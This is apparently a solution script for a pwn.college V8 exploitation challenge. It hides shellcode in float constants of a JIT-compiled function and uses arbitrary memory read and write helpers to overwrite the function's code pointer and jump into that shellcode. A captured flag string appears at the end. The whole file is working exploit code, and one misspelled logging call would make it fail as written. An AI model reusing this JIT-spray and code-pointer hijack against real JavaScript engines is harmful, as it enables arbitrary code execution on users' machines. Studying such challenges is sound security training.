const logInfo = (m) => console.log(`[*] ${m}`);
const logOK   = (m) => console.log(`[+] ${m}`);
const logErr  = (m) => console.log(`[-] ${m}`);

// execve("catflag", 0, 0);
const shell = () => {return [1.9995716422075807e-246,
    1.9710255944286777e-246,
    1.97118242283721e-246,
    1.971136949489835e-246,
    1.9711826272869888e-246,
    1.9711829003383248e-246,
    -9.254983612527998e+61];}

// %PrepareFunctionForOptimization(shell);
// shell();
// %OptimizeFunctionOnNextCall(shell);
// shell();
// %DebugPrint(shell);

for(let i = 0; i< 10000; i++) shell();
// %DebugPrint(shell);

let shell_addr = GetAddressOf(shell);
logOK("shell @ " + shell_addr);

let code_ptr = ArbRead32(shell_addr + 0xc);
logOK("code_ptr @ " + code_ptr);

let rwx_addr = ArbRead32(code_ptr - 1 + 0x14);
logOK("rwx_addr @ "+ rwx_addr);

let shellcode_start = rwx_addr +  0x69 + 2;
logINfo("shellcode_start @ " + shellcode_start);
ArbWrite32(code_ptr - 1 + 0x14,shellcode_start);

shell()
// pwn.college{I4ADiY6UMtT49J_dwROiM6hWBz4.dVTO3UDL1MTNzYzW}
